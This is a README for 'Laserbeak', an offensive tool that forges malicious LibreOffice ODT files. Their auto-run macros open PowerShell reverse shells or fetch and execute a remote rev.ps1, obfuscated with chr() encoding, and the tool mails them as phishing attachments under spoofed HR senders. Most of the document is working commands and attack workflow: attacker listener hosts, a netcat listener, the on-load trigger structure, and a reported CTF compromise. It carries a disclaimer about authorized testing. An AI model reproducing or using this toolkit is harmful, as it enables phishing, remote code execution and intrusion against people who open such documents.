# Laserbeak 🦅

```
  _                        _                      _    
 | |    __ _ ___  ___ _ __| |__   ___  __ _  ___| | __
 | |   / _` / __|/ _ \ '__| '_ \ / _ \/ _` |/ __| |/ /
 | |__| (_| \__ \  __/ |  | |_) |  __/ (_| | (__|   < 
 |_____\__,_|___/\___|_|  |_.__/ \___|\__,_|\___|_|\_\

        [ Decepticon Infiltration System ]
        [ ODT Macro Injector — Phishing Forge ]
        [ Soundwave's eyes inside enemy lines ]
```

**Laserbeak** is an ODT macro injector and phishing document generator designed for authorized penetration testing engagements and CTF labs.

Part of the **Soundwave Decepticon Recon Suite**.

---

## ⚠️ Disclaimer

This tool is intended **exclusively for authorized penetration testing, red team engagements, and CTF lab environments**.  
Usage against systems without explicit written permission is illegal. The author assumes no responsibility for misuse.

---

## Features

- Generates malicious `.odt` documents with embedded LibreOffice Basic macros
- `on-load` event trigger — macro fires automatically on document open
- Three operation modes: `forge`, `deliver`, `chain`
- Built-in PS reverse shell generator (no external tools required)
- IEX preset — serves a PS payload via integrated HTTP server
- Macro obfuscation via `chr()` encoding
- Base ODT template injection (inject into existing documents)
- Integrated SMTP delivery via `swaks`
- Post-forge structure validation (`--loot`)

---

## Installation

```bash
git clone https://github.com/Starscream007/laserbeak.git
cd laserbeak
chmod +x laserbeak.py

# Optional dependency for delivery
sudo apt install swaks
```

No external Python dependencies — stdlib only.

---

## Usage

### forge — Build the malicious ODT

```bash
# IEX preset: macro fetches and executes rev.ps1 from Kali HTTP server
python3 laserbeak.py forge --preset iex --lhost 10.10.14.10 -o cv.odt

# Embedded PS reverse shell (no external HTTP server needed)
python3 laserbeak.py forge --lhost 10.10.14.10 --lport 4444 -o cv.odt

# Raw command
python3 laserbeak.py forge --cmd "cmd /c calc.exe" -o test.odt

# Base64 PS payload
python3 laserbeak.py forge -p JABjAGwA... -o evil.odt

# Inject into existing ODT template
python3 laserbeak.py forge -i template.odt --lhost 10.10.14.10 --lport 4444 -o evil.odt

# With macro obfuscation (chr() encoding)
python3 laserbeak.py forge --lhost 10.10.14.10 --lport 4444 --obfuscate -o evil.odt

# Validate ODT structure after forge
python3 laserbeak.py forge --preset whoami -o test.odt --loot
```

**Available presets:**

| Preset | Description |
|--------|-------------|
| `calc` | Opens calculator — basic sanity check |
| `whoami` | Writes `whoami` output to `C:\Windows\Temp\out.txt` |
| `ping` | Pings LHOST — confirms outbound connectivity |
| `iex` | IEX download cradle — fetches and executes `rev.ps1` from Kali HTTP server |

---

### deliver — Send via SMTP

```bash
python3 laserbeak.py deliver \
  --to career@target.htb \
  --from hr@target.htb \
  --server 10.129.X.X \
  --attach cv.odt \
  --subject "Job Application"
```

---

### chain — Full chain in one command

Forge + HTTP server + rev.ps1 generation + optional SMTP delivery.

```bash
# Full chain with delivery
python3 laserbeak.py chain \
  --lhost 10.10.14.10 --lport 4444 --lport-http 8383 \
  --to career@job.local --from hr@job.local \
  --server 10.129.X.X -o cv.odt

# Without SMTP (forge + HTTP server only — send manually)
python3 laserbeak.py chain --lhost 10.10.14.10 --lport 4444 -o cv.odt
```

Chain workflow:
1. Generates `rev.ps1` in the working directory
2. Starts HTTP server in background (daemon thread)
3. Forges `.odt` with `iex` preset
4. Delivers via swaks if SMTP params provided
5. Displays listener hint and keeps HTTP server alive

Start your listener separately:
```bash
rlwrap nc -lvnp 4444
```

---

## Loot Check

`--loot` validates the internal ODT structure post-forge:

```
── LOOT CHECK ─────────────────────────────────────────
 [+]   Basic/Libraries/libraries.xml        (...)
 [+]   Basic/Standard/Module1.xba           (...)
 [+]   Basic/Standard/script-lc.xml         (...)
 [+]   Basic/script-lc.xml                  (...)
 [+]   META-INF/manifest.xml                (...)
 [+]   content.xml                          (...)
 [+]   mimetype                             (...)
 [+]   styles.xml                           (...)

── STRUCTURE VALIDATION ───────────────────────────────
 [+]   ✓ mimetype present
 [+]   ✓ manifest present
 [+]   ✓ macro Module1.xba present
 [+]   ✓ script-lc.xml present
 [+]   ✓ Basic/script-lc.xml present
 [+]   ✓ Libraries/libraries.xml present
 [+]   ✓ content.xml present
 [+]   ✓ event-name="on-load" (correct)
 [+]   Structure valid — document should trigger on open
```

---

## ODT Structure

```
cv.odt (ZIP)
├── mimetype                        ← non-compressed, must be first
├── META-INF/
│   └── manifest.xml
├── content.xml                     ← on-load event listener
├── styles.xml
└── Basic/
    ├── script-lc.xml
    ├── Libraries/
    │   └── libraries.xml
    └── Standard/
        ├── Module1.xba             ← macro payload
        └── script-lc.xml
```

**Key technical details:**
- `event-name="on-load"` (not `onLoad`) — LibreOffice requires the hyphenated form
- `mimetype` must be the first entry in the ZIP, stored uncompressed (`ZIP_STORED`)
- `Basic/Libraries/` directory is required for LibreOffice to load the macro library at runtime

---

## Tested On

| Environment | Status |
|-------------|--------|
| HTB job.htb | ✅ Validated — user flag obtained |
| LibreOffice 7.x (Windows) | ✅ |
| Kali Linux 2024+ | ✅ |

---

## Related Tools

- [Soundwave](https://github.com/Starscream007) — Decepticon Recon Suite
- [gMSA-decoder](https://github.com/Starscream007/gMSA-decoder) — Cross-forest gMSA blob decoder

---

## Author

**Starscream007**  
Junior Pentester/Redteamer | CRTE . CPTS · PNPT · PJPT · PWPA  

> *Peace through Tyranny.*
